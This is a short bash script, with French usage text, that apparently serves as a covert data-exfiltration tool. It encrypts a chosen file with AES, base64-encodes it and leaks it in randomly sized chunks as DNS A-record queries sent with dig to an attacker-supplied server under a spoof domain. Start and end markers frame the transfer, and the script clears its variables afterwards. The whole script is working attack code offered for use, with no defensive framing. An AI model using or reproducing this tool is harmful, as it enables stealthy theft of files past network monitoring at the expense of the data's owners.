#!/bin/bash
date
encrypt_and_base64() {
    local input_file="$1"
    local encrypted_file
    encrypted_file=$(openssl enc -aes-256-cbc -salt -pbkdf2 -in "$input_file" -pass "pass:$key" -a)
    echo "$encrypted_file"
}


if [ $# -ne 4 ]
then
    echo "Usage: $0 <fichier> <adresse_ip> <spoof_domain> <key>"
    exit 1
fi

file="$1"
ip="$2"
spoof_domain="$3"
key="$4"
start_flag="==START=="
end_flag="==END=="
domain_length=${#spoof_domain}
random_packet_size=$(( (RANDOM % (63 - domain_length - 20)) + 20 ))


#start_flag
echo -n "$start_flag" | while read -r -n 9 block;
do
        query="${block}.${spoof_domain}"
        dig @"$ip" +short -t A "$query" +time=1 +tries=1 >/dev/null
done

#file
encrypted_file=$(encrypt_and_base64 "$file")
while IFS= read -r -n $random_packet_size block;
do
        query="${block}.${spoof_domain}"
        dig @"$ip" +short -t A "a$query" +time=1 +tries=1 >/dev/null
	random_packet_size=$(( (RANDOM % (63 - domain_length - 20)) + 20 ))
done <<< "$encrypted_file"


#end_flag
echo -n "$end_flag" | while read -r -n 7 block;
do
        query="${block}.${spoof_domain}"
        dig @"$ip" +short -t A "$query" +time=1 +tries=1 >/dev/null
done

unset key file ip spoof_domain start_flag end_flag random_packet_size encrypted_file
date
